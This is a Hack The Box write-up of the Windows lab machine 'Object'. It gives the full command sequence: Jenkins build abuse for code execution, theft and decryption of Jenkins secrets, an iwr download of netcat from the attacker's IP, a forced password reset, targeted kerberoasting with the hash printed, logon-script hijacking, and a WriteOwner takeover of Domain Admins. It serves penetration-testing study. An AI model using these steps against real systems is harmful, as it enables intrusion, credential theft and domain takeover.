---
title: "[HTB] Machine: Object"
description: "[HTB] Machine: Object"
date: 2023-09-08
menu:
  sidebar:
    name: "[HTB] Machine: Object"
    identifier: htb-machine-Object
    parent: htb-machines-windows
    weight: 10
hero: images/object.png
tags: ["HTB", "iis", "wfuzz", "jenkins", "cicd", "firewall", "windows-firewall", "jenkins-credential-decryptor", "pwn-jenkins", "evil-winrm", "crackmapexec", "bloodhound", "sharphound", "active-directory", "github", "forcechangepassword", "genericwrite", "writeowner", "logon-script", "powerview", "scheduled-task", "powershell"]
---

# Object
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.11.132 -T4                                                          
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 09:35 BST
Nmap scan report for 10.10.11.132 (10.10.11.132)
Host is up (0.092s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
8080/tcp open  http-proxy
```
```
└─$ nmap -Pn -p80,5985,8080 -sC -sV 10.10.11.132 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 09:38 BST
Nmap scan report for 10.10.11.132 (10.10.11.132)
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mega Engines
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.89 seconds

```

- Web Server

![](./images/1.png)

- Port `8080`

![](./images/2.png)

- `gobuster`
```
└─$ gobuster dir -u http://object.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 txt --no-error 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://object.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/10 09:43:37 Starting gobuster in directory enumeration mode
===============================================================
Progress: 220444 / 220561 (99.95%)
===============================================================
2023/09/10 10:02:16 Finished
===============================================================

```

- `vhosts`
```
└─$ wfuzz -u http://object.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.object.htb' --hh 29932
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://object.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================


Total time: 341.1022
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 14.62611

```
## Foothold/User #1
- Let's create an account in `Jenkins`
  - Version: `Jenkins 2.317`

![](./images/3.png)

- Looks like we can create a project

![](./images/4.png)

![](./images/5.png)

- Set a build step to `Execute Windows batch command`

![](./images/6.png)

![](./images/7.png)

- But we don't have a build option
  - We can try via `Build Triggers`:
    - Set a `schedule`
    - Or via manual triggering using `API` key
  - Second method looks better
- We have to create a token
  - Save it
    - We'll use it for authentification
  - Set a `Build trigger` to `Trigger builds remotely (e.g., from scripts)`
    - Input `token name` that we created
  - Then save it

![](./images/8.png)

![](./images/9.png)

- Now we need to follow the format `http://[username]:[token]@[host]/job/[job name]/build?token=[token name]`
  - No response from the server
```
└─$ curl 'http://pentest:111ea470a47641ff99f39fbef49e412296@10.10.11.132:8080/job/pentest/build?token=pentest'
```

- But if we check the `Build History` of the project we see a new entry
  - Open it and click to `Console Output`
  - We have our code execution

![](./images/11.png)

![](./images/10.png)

- We can ping our box
  - But I couldn't download anything
    - `powershell -c iwr http://10.10.16.9/nc64.exe -outfile c:\programdata\nc.exe`

![](./images/12.png)

![](./images/13.png)

- The next steps will be based on this [post](https://www.jenkins.io/doc/developer/security/secrets/)
  - The idea is to retrieve a password of `admin` user and check for password reuse
  - We need to retrieve `config.xml`, `master.key` and `hudson.util.Secret`
    - https://www.jenkins.io/doc/developer/security/secrets/
    - https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security#jenkins-secrets
  - Then we can decrypt the password using [pwn_jenkins](https://github.com/gquere/pwn_jenkins)
  - We know that we run the commands from `C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\pentest`
    - You can confirm it via `cmd /c cd`
- Now we need to find `users` directory and locate `admin`'s `config.xml`

![](./images/14.png)

- Now we check the `users` directory 
  - We see `admin`'s folder and the `config.xml` inside it

![](./images/15.png)

![](./images/16.png)

- Retrieve `config.xml`

![](./images/17.png)

- Save `config.xml` on our box

```
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>

```

- Now we need to get the `master.key` and `hudson.util.Secret`
  - Both are located in `secrets` directory
    - `hudson.util.Secret` is in binary format
    - We need to convert to `base64` to retrieve it
  - Save them

![](./images/18.png)

![](./images/19.png)

- Now we use [pwn_jenkins](https://github.com/gquere/pwn_jenkins)
```
└─$ pwn_jenkins/offline_decryption/jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml 
c1cdfun_d2434
```

- Let's check if it's valid
  - `oliver:c1cdfun_d2434`

```
└─$ crackmapexec winrm 10.10.11.132 -u oliver -p c1cdfun_d2434
SMB         10.10.11.132    5985   NONE             [*] None (name:10.10.11.132) (domain:None)
HTTP        10.10.11.132    5985   NONE             [*] http://10.10.11.132:5985/wsman
WINRM       10.10.11.132    5985   NONE             [+] None\oliver:c1cdfun_d2434 (Pwn3d!)
```

- We got the `shell`
```
└─$ evil-winrm -i 10.10.11.132 -u oliver -p 'c1cdfun_d2434'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\oliver\Documents> 
```
## User #2
- We have other users
```
*Evil-WinRM* PS C:\users> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
maria                    oliver
The command completed with one or more errors.

```

- By looking at the open ports we could think that it's a domain controller
```
*Evil-WinRM* PS C:\users> netstat -an | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49683          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49696          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:54873          0.0.0.0:0              LISTENING
  TCP    10.10.11.132:53        0.0.0.0:0              LISTENING
  TCP    10.10.11.132:139       0.0.0.0:0              LISTENING
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING
  TCP    [::]:80                [::]:0                 LISTENING
  TCP    [::]:88                [::]:0                 LISTENING
  TCP    [::]:135               [::]:0                 LISTENING
  ...
```

- Let's launch `bloodhound`
```
*Evil-WinRM* PS C:\users\oliver\documents> upload SharpHound.exe
                                        
Info: Uploading SharpHound.exe to C:\users\oliver\documents\SharpHound.exe
                                        
Data: 1402196 bytes of 1402196 bytes copied
                                        
Info: Upload successful!
```
```
*Evil-WinRM* PS C:\users\oliver\documents> .\Sharphound.exe -c All
2023-09-10T05:43:21.4997147-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-09-10T05:43:21.6871611-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-09-10T05:43:21.7184292-07:00|INFORMATION|Initializing SharpHound at 5:43 AM on 9/10/2023
2023-09-10T05:43:21.8746420-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-09-10T05:43:22.0778650-07:00|INFORMATION|Beginning LDAP search for object.local
2023-09-10T05:43:22.1246657-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-09-10T05:43:22.1402754-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-09-10T05:43:52.7809247-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2023-09-10T05:44:07.7027667-07:00|INFORMATION|Consumers finished, closing output channel
2023-09-10T05:44:07.7340274-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-09-10T05:44:07.8121376-07:00|INFORMATION|Status: 92 objects finished (+92 2.044445)/s -- Using 41 MB RAM
2023-09-10T05:44:07.8121376-07:00|INFORMATION|Enumeration finished in 00:00:45.7466536
2023-09-10T05:44:07.9058952-07:00|INFORMATION|Saving cache with stats: 52 ID to type mappings.
 52 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-09-10T05:44:07.9058952-07:00|INFORMATION|SharpHound Enumeration Completed at 5:44 AM on 9/10/2023! Happy Graphing!
```
```
*Evil-WinRM* PS C:\users\oliver\documents> download 20230910054407_BloodHound.zip
                                        
Info: Downloading C:\users\oliver\documents\20230910054407_BloodHound.zip to 20230910054407_BloodHound.zip
                                        
Info: Download successful!

```

- We have a `ForceChangePassword` over `smith`

![](./images/20.png)

- We can change it using `Powerview`
  - Let's upload it

```
*Evil-WinRM* PS C:\Programdata> upload powerview.ps1
                                        
Info: Uploading powerview.ps1 to C:\Programdata\powerview.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Programdata> import-module .\powerview.ps1
*Evil-WinRM* PS C:\Programdata> $password = ConvertTo-SecureString 'P@ssw0rd!@#' -AsPlainText -Force
*Evil-WinRM* PS C:\Programdata> Set-DomainUserPassword -Identity smith -AccountPassword $password
*Evil-WinRM* PS C:\Programdata> 

```

- Now we can `winrm` as `smith`
```
└─$ evil-winrm -i 10.10.11.132 -u smith -p 'P@ssw0rd!@#'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\smith\Documents> 

```

## User #3
- `smith` has `GenericWrite` over `maria`
  - `A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket.`

![](./images/21.png)

- Let's set `SPN` for `maria` and get her hash
  - We can use `Set-DomainObject` from `Powerview` or `setspn -a nonexistent/BLAHBLAH object.local\maria`
```
*Evil-WinRM* PS C:\programdata> import-module .\powerview.ps1
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
*Evil-WinRM* PS C:\programdata> Get-DomainUser maria 


logoncount            : 39
badpasswordtime       : 10/22/2021 5:54:46 AM
distinguishedname     : CN=maria garcia,CN=Users,DC=object,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : maria garcia
lastlogontimestamp    : 9/10/2023 1:28:36 AM
userprincipalname     : maria@object.local
name                  : maria garcia
objectsid             : S-1-5-21-4088429403-1159899800-2753317549-1106
samaccountname        : maria
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 9/10/2023 1:02:22 PM
instancetype          : 4
usncreated            : 20645
objectguid            : 9340fcdd-2f1e-4f89-bafe-e1dcdd5c2b6f
sn                    : garcia
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=object,DC=local
dscorepropagationdata : {10/22/2021 10:21:48 AM, 10/22/2021 10:10:02 AM, 10/22/2021 10:04:25 AM, 10/22/2021 9:52:43 AM...}
serviceprincipalname  : nonexistent/BLAHBLAH
givenname             : maria
memberof              : CN=Remote Management Users,CN=Builtin,DC=object,DC=local
lastlogon             : 9/10/2023 1:28:36 AM
badpwdcount           : 0
cn                    : maria garcia
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 10/22/2021 4:16:32 AM
primarygroupid        : 513
pwdlastset            : 10/21/2021 9:16:32 PM
usnchanged            : 159969

```

- Now let's get the hash
  - But it requires a credential object
```
*Evil-WinRM* PS C:\programdata> Get-DomainSPNTicket -SPN "nonexistent/BLAHBLAH"
Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'nonexistent/BLAHBLAH' from user 'UNKNOWN' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details."
```

- Let's generate one and run it again
```
*Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString 'P@ssw0rd!@#' -AsPlainText -Force
*Evil-WinRM* PS C:\programdata> $creds = New-Object System.Management.Automation.PSCredential('object.local\smith', $password)
*Evil-WinRM* PS C:\programdata> Get-DomainSPNTicket -SPN "nonexistent/BLAHBLAH" -Credential $creds
Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: object.local\smith


SamAccountName       : UNKNOWN
DistinguishedName    : UNKNOWN
ServicePrincipalName : nonexistent/BLAHBLAH
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$26C26D7F9C930DDD789233472D331123$25A8DDA3FA84C7C424C81471FA05EAC14A51D10C77146012CF2F1C092AA66ADB653D6644A47A42A4BAE661A28EDE88831DC91E81951E5D8A45389F0E325CB30159E47E95AF8760
62615187D1E69B63AC06437952B541896C8516018AFDBFC1995B10C302AF8B36A91732D52988E2FBC1F320241D23789A88BD6D66CAB6C937A1D5D6DFA5AC9861B1D1F5EFAB4F1C839AB3BEC8713C5831B340D368A017DB7C34A67DC4957463B50EA0EFAC54561635A452289F314FCF19A6
E71A9672A7BC5291BABE17958A54966A9EAD7FFD1A5FABFBAB4C410A843C746D20F6E4D661D18C93A3084A23171DD89329A3D33F9DDF8ED380F696B71913B87823F73AD67DE7B3D9987FA0D265AAA363235CC516D71CAFDFEB961A54F9F55123A527D4AC9E57D8A1191623A8234D60070F
C121D4DC648D1B0F14B92C91E355F3A469D03E5C6FE426178ECDD1F83C2A7306B1D91397E8553957D51015F7B580C140AF8566CFC4B92E20A00BEF8E0CDB474342183FFC7643F47F7DA687F3410DA7DE251BEB034AFB9B2AC8BAE3ABB73052FD7FD6618FCDB721E089B6671BA0A533D748
0B63A60D4D33C5B7C6C143BDC69D0FFFBEDF20E919DAFC367E75A338DB043DEDA5DCBCD9491640F93856F40676AA5CC62D8B7733599F01F72ACB7F0E49DCCF07B8EA6A56E7DE62D2357EB15A4D57EBC5BA381CDD2A051582E9E8CD66E715C88A11EB308FC7D1041AB1915E784F58AFB2A7
DC0DED4C6D777B06C885991EBD4B1778F83FFB2DDCAD681501CB9C63A40B2F9C3D374A87ACB4ACE7A25C400F46E7E8C8A5B988194ED720F1931E692FEFA388F45C173E6E688D5A6C8B1D5D01AF52F67637A4F47E5CBF8196D9C574AE0706F3E04BA602844A14E7C402063E313AA79829A1
EB9321271BFBEE69ED957A1683248A5958E2C988CF12BFFA88AF594EDD73EEF768A30575070184F05F2BD2E42BDA7F2F84F5B28CA9AD2A59F8824C4BC7D2ED96CE7C9F47578ED8D4CD53C18C4A6CE2EEA5C99B9CF86813A43A6132E926C03B1960BAB291C4FE8CCC3FF00E5CB942388121
D3E12599EC9E74A5052C55A7A9AD7593525F464AD95465FF5812E6C7A0C3378FF6B015EC4FAF2B06461F59D003B598C2F203A5BE5070675D9B2656FA9D997D4632E4A20C144314C87AD8EC61CB6045F9C11D81C0367E3F7A77D6B87411C0E6B7B56F5D3E213FBA99C6C813B28550929DA0
F401BA7FEE04A9FBFAE1778D1C48037968FEDAFBBB4EEDE75E394784896E4921DF7875DF8CB27009EF5656D78A0E6A6C503E032430D967DC1BFD5E6992649460CBF6D01BC69FAA696CAD4CA6C619DC1FE3C06BCC7F6BB73A0B625675CA9C60B4C442EF7E8598A1BE1EDF06E680845FC4F0
2A38BB5DE5084CB2DA01F956255A05860A4C8B5C7384D45D587D70B94F8DE89E6D95FFDB27EAF4BCAC9F0BBA01CB0EC804DCD7BB629568CE94B364F4F3180F0AE7695102B3AC503EDB28E85CED7D5B11E23AC1C4B5F9EC9CD5C8C25313

Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle
```

- But I couldn't crack it
  - Another way is to modify `Logon Scripts`
    - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite
    - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericwrite-on-user
    - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user
  - Let's do it
    - Note that we have a firewall, so we probably won't be able to connect back
```
*Evil-WinRM* PS C:\programdata> echo "get-childitem -recurse c:\users\maria\ -include *.txt,*.xml,*.xls > c:\programdata\out" > cmd.ps1
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
*Evil-WinRM* PS C:\programdata> ls


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-       10/21/2021   3:13 AM                Microsoft
d-----       10/21/2021  12:05 AM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----        4/10/2020   5:48 AM                ssh
d-----        4/10/2020  10:49 AM                USOPrivate
d-----        4/10/2020  10:49 AM                USOShared
d-----        8/25/2021   2:57 AM                VMware
-a----        9/10/2023   6:17 AM            178 cmd.ps1
-a----        9/10/2023   6:11 AM          45272 nc64.exe
-a----        9/10/2023   6:17 AM            830 out
-a----        9/10/2023   5:52 AM         770279 powerview.ps1
-a----        9/10/2023   5:42 AM        1051648 SharpHound.exe
-a----        9/10/2023   6:14 AM             98 shell.ps1


*Evil-WinRM* PS C:\programdata> type out


    Directory: C:\users\maria\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls
```

- We have an interesting file `Engines.xls`
  - Let's download it
```
*Evil-WinRM* PS C:\programdata> echo "copy C:\users\maria\Desktop\Engines.xls c:\programdata" > cmd.ps1
*Evil-WinRM* PS C:\programdata> ls


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-       10/21/2021   3:13 AM                Microsoft
d-----       10/21/2021  12:05 AM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----        4/10/2020   5:48 AM                ssh
d-----        4/10/2020  10:49 AM                USOPrivate
d-----        4/10/2020  10:49 AM                USOShared
d-----        8/25/2021   2:57 AM                VMware
-a----        9/10/2023   6:19 AM            114 cmd.ps1
-a----       10/26/2021   8:13 AM           6144 Engines.xls
-a----        9/10/2023   6:11 AM          45272 nc64.exe
-a----        9/10/2023   6:19 AM            830 out
-a----        9/10/2023   5:52 AM         770279 powerview.ps1
-a----        9/10/2023   5:42 AM        1051648 SharpHound.exe
-a----        9/10/2023   6:14 AM             98 shell.ps1

*Evil-WinRM* PS C:\programdata> download Engines.xls
                                        
Info: Downloading C:\programdata\Engines.xls to Engines.xls
                                        
Info: Download successful!
```

- We have a few creds

![](./images/22.png)

- Pass them to `crackmapexec`
```
└─$ crackmapexec winrm 10.10.11.132 -u maria -p passwords.list
SMB         10.10.11.132    5985   NONE             [*] None (name:10.10.11.132) (domain:None)
HTTP        10.10.11.132    5985   NONE             [*] http://10.10.11.132:5985/wsman
WINRM       10.10.11.132    5985   NONE             [-] None\maria:d34gb8@
WINRM       10.10.11.132    5985   NONE             [-] None\maria:0de_434_d545
WINRM       10.10.11.132    5985   NONE             [+] None\maria:W3llcr4ft3d_4cls (Pwn3d!)
```

- We found the creds: `maria:W3llcr4ft3d_4cls`
```
└─$ evil-winrm -i 10.10.11.132 -u maria -p 'W3llcr4ft3d_4cls'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents> 
```
## Root
- I ran `bloodhound` again
  - I noticed that we have to run it every time we get new creds to get more info
  - Now we can see that `maria` has `WriteOwner` over `Domain Admins` group

![](./images/23.png)

- We can set the owner to `maria` and add her to the group
  - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner
  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#writeowner-on-group
  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#writedacl-+-writeowner
```
*Evil-WinRM* PS C:\programdata> import-module .\powerview.ps1
*Evil-WinRM* PS C:\programdata> Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
*Evil-WinRM* PS C:\programdata> Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
*Evil-WinRM* PS C:\programdata> net user maria
User name                    maria
Full Name                    maria garcia
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/21/2021 9:16:32 PM
Password expires             Never
Password changeable          10/22/2021 9:16:32 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 C:\\programdata\\cmd.ps1
User profile
Home directory
Last logon                   9/10/2023 6:24:42 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
```

- We need to relogin to update our session
  - [You should always need to re-authenticate in order for the user's security token to contain the new group membership.](https://serverfault.com/questions/558157/why-sometimes-is-required-to-log-off-and-log-on-back-again-adding-a-group-to-a-u)
```
*Evil-WinRM* PS C:\Users\maria\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users               Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OBJECT\Domain Admins                          Group            S-1-5-21-4088429403-1159899800-2753317549-512 Mandatory group, Enabled by default, Enabled group
OBJECT\Denied RODC Password Replication Group Alias            S-1-5-21-4088429403-1159899800-2753317549-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level          Label            S-1-16-12288
```